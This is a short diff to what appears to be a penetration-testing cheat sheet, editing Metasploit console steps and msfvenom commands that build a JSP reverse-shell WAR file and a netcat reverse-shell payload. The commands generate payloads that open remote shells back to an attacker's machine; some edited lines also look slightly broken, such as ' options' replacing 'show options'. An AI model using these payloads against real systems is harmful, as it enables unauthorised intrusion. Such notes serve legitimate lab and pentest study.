@@ -4,11 +4,12 @@ MSFconsole
 ```
 search $TARGET_SERVICE
 use X
-show options
+ options
 set LHOST
 set RHOST
 exploit
 shell
+background
 ```
 
 See payload options:
@@ -26,7 +27,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LOCAL_IP LPORT=4444 -f war > runme
 Create bash reverse shell line:
 
 ```shell
-msfvenom -p cmd/unix/reverse_netcat RHOST=192.168.66.136 RPORT=4444 R
+msfvenom -p cmd/unix/reverse_netcat RHOST=tun0 RPORT=4444 R
 ```
 
 ```shell
